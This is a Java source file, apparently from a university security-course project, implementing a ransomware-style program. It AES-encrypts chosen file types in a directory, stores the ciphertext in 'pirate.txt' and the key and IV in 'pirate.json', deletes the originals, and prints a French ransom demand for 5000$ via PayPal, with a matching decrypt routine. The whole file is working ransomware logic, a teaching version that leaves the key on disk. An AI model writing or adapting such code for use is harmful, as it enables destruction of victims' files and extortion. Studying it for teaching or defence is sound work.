package ca.ulaval.glo3100.aes;

import ca.ulaval.glo3100.args.Args;
import ca.ulaval.glo3100.args.FileType;
import ca.ulaval.glo3100.console.Logger;
import ca.ulaval.glo3100.utils.*;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.io.File;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.List;
import java.util.stream.Collectors;

public class AESService {

    private static final String ENCRYPTED_FILES_FILENAME = "pirate.txt";
    private static final String ENCRYPTION_PARAMS_FILENAME = "pirate.json";

    public static void execute(Args args) {
        switch (args.operation) {
            case ENCRYPT:
                encrypt(args.directory, args.fileTypes);
                break;
            case DECRYPT:
                decrypt(args.directory);
                break;
        }
    }

    /**
     * @param directory Directory to encrypt files in
     * @param fileTypes File types to encrypt
     */
    private static void encrypt(File directory, List<FileType> fileTypes) {
        Logger.logDebug(String.format(
                "Encrypting with directory %s and file types %s",
                directory,
                fileTypes.stream().map(FileType::toString).collect(Collectors.joining(", "))));

        // Get files in directory
        List<File> files = FileUtils.getFiles(directory, fileTypes);
        List<String> filenames = files.stream().map(file -> file.getName()).collect(Collectors.toList());

        Logger.logDebug(String.format(
                "Files : %s",
                files.stream().map(File::getPath).collect(Collectors.joining(", "))));

        // Convert files to bytes
        List<byte[]> filesAsBytes = FileUtils.toBytes(files);

        SecretKey key = EncryptionParamsUtils.generateKey();
        Logger.logDebug(String.format("Key : %s", Base64.getEncoder().encodeToString(key.getEncoded())));
        IvParameterSpec iv = EncryptionParamsUtils.generateIv();
        Logger.logDebug(String.format("IV : %s", Base64.getEncoder().encodeToString(iv.getIV())));

        // Encrypt file bytes
        List<byte[]> encryptedFilesAsBytes = CipherUtils.encrypt(filesAsBytes, key, iv);
        List<String> encryptedFilesAsStrings = ByteUtils.toStrings(encryptedFilesAsBytes);

        // Save filenames and contents to pirate.txt
        FileUtils.saveFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME, encryptedFilesAsStrings);
        Logger.logDebug(String.format("Save encrypted files to %s", ENCRYPTED_FILES_FILENAME));

        // Save key and iv to pirate.json
        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv, filenames);
        Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));

        // Delete files
        FileUtils.deleteFiles(files);

        // Display ransom message
        Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
    }

    /**
     * @param directory Directory to decrypt files from
     */
    private static void decrypt(File directory) {
        Logger.logDebug(String.format("Decrypting with directory %s", directory));

        // Get encrypted files from pirate.txt
        List<String> filesAsStrings = FileUtils.getFilesAsStrings(directory, ENCRYPTED_FILES_FILENAME);
        Logger.logDebug(String.format("Read encrypted files from %s", ENCRYPTED_FILES_FILENAME));

        // Get encryption params (key and iv) from pirate.json
        EncryptionParams encryptionParams = JsonUtils.getEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME);
        Logger.logDebug(String.format("Read key and iv to %s", ENCRYPTION_PARAMS_FILENAME));

        // Convert encryption params to their original forms
        SecretKey key = EncryptionParamsUtils.toSecretKey(encryptionParams.key);
        IvParameterSpec iv = EncryptionParamsUtils.toIvParameterSpec(encryptionParams.iv);

        // Convert files as strings to files as bytes
        List<byte[]> filesAsBytes = ByteUtils.toBytes(filesAsStrings);

        // Decrypt files as strings
        List<byte[]> decryptedFilesAsBytes = CipherUtils.decrypt(filesAsBytes, key, iv);

        // Save files to given directory
        FileUtils.saveFilesAsBytes(directory, encryptionParams.filenames, decryptedFilesAsBytes);

        // Display decryption message
        Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
    }
}
